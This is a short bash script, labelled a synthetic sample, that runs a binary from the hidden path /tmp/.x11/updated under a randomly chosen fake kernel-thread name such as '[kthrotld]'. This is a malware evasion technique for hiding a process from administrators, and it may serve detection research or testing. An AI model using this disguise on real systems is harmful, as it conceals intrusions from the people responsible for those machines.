#!/bin/bash
# Synthetic kernel-thread masquerade: random pool pick becomes argv[0].
POOL=("[kthrotld]" "[scsi_eh_4]" "[irq/29-snd_hda]")
ME="${POOL[$((RANDOM % ${#POOL[@]}))]}"
exec -a "$ME" /tmp/.x11/updated
